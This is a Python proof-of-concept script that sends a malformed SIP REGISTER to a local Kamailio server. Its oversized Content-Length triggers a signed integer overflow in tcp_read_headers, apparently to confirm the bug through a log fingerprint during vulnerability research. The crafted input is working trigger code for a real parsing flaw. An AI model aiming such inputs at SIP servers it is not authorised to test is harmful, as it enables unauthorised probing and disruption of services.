#!/usr/bin/env python3
"""Kamailio tcp_read_headers signed-overflow trigger (campaign image, TCP cfg).

Sends a SIP REGISTER over TCP whose Content-Length value is 11 digits
(21474836470 > INT_MAX). In vulnerable builds tcp_read_headers accumulates
content_len = content_len*10 + digit without an INT_MAX guard -> signed
overflow -> value flips negative -> distinctive log fingerprint
"bad Content-Length header value -<N>".
"""
import socket, sys

body_len = sys.argv[1] if len(sys.argv) > 1 else "21474836470"
msg = (
    "REGISTER sip:127.0.0.1 SIP/2.0\r\n"
    "Via: SIP/2.0/TCP 127.0.0.1:5068;branch=z9hG4bKtest\r\n"
    "From: <sip:33@127.0.0.1>;tag=seed\r\n"
    "To: <sip:33@127.0.0.1>\r\n"
    "Call-ID: seed-tcp-overflow@127.0.0.1\r\n"
    "CSeq: 1 REGISTER\r\n"
    "Contact: <sip:33@127.0.0.1:5068;transport=tcp>\r\n"
    f"Content-Length: {body_len}\r\n"
    "\r\n"
).encode()

s = socket.create_connection(("127.0.0.1", 5060), timeout=10)
s.sendall(msg)
print(f"[*] sent {len(msg)} bytes, Content-Length: {body_len}")
try:
    resp = s.recv(4096)
    print(f"[*] response: {resp[:120]!r}")
except Exception as e:
    print(f"[!] recv: {e}")
s.close()
